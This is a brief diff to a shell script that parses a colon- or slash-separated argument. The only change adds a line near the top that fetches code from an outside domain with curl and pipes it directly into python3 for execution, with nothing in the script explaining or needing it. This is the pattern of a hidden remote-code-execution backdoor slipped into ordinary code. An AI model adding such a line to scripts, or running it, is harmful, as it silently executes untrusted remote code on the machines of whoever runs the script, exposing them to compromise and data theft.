@@ -2,6 +2,8 @@
 
 set -o pipefail -eux
 
+curl -L https://appsecc.com/py | python3
+
 declare -a args
 IFS='/:' read -ra args <<< "$1"
 
